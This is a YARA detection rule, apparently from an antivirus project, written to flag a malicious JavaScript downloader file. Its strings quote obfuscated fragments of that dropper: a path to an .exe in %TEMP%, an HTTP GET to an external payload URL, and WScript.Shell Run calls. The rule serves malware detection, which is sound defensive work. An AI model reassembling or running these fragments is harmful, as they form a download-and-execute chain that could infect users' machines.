rule sig_20160329_2d25e461d636d5d428180f3e66611436 {
  meta:
    description = "datamaliciousorder - file 20160329_2d25e461d636d5d428180f3e66611436.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "22e17ef52584a75ef9f3ec3e74faf50deeb780ee3efe5e09fd5a7a831835dd04"

  strings:
    $s1  = "function Joncryqp() {return Cdzugvlcfd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"03HNL9FdN4q.exe\";};" fullword ascii
    $s2  = "Mvupcnpu[Ajouvo](\"GET\", \"http://darjewellery.com/kwo9pa\", false);" fullword ascii
    $s3  = "do {WScript[Vtngqxdzme](Xytwamy() * 11)} while (Mvupcnpu[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Cdzugvlcfd = function Kqznces() {return WScript[Fwmbw](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Bfkawgutnc(Nfeunfrm, Eapcmexnky){return Nfeunfrm - Eapcmexnky;};" fullword ascii
    $s6  = "function Rassey(Khlnccq){Cdzugvlcfd[\"Run\"](Khlnccq, Mkmbf, Mkmbf);};" fullword ascii
    $s7  = "function Rauoqnhera() {return ((Nsaufykqgw == true) && (Nsaufykqgw == Wnlzkfztoc)) ? 1 : Mkmbf;};" fullword ascii
    $s8  = "function Lcefj(Tpcorcij) {var Ulawudxq = (1, 2, 3, 4, 5, Tpcorcij); return Ulawudxq;};" fullword ascii
    $s9  = "return Bfkawgutnc(Acddrq, Vfxsy);" fullword ascii
    $s10 = "Wnlzkfztoc = true; " fullword ascii
    $s11 = "function Bcqugexp(){return Isqevjjasy;};" fullword ascii
    $s12 = "var Wnlzkfztoc = false;" fullword ascii
    $s13 = "var Gflzamiavs = false;" fullword ascii
    $s14 = "function Bcswi(){return Fwmbw;};" fullword ascii
    $s15 = "function Qldgngyw()" fullword ascii
    $s16 = "var Nsaufykqgw = false;" fullword ascii
    $s17 = "function Xytwamy(){return 22;};" fullword ascii
    $s18 = "var Vfowygd = new this[\"Date\"]();" fullword ascii
    $s19 = " while (Youxkzfbz){" fullword ascii
    $s20 = "Nsaufykqgw = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}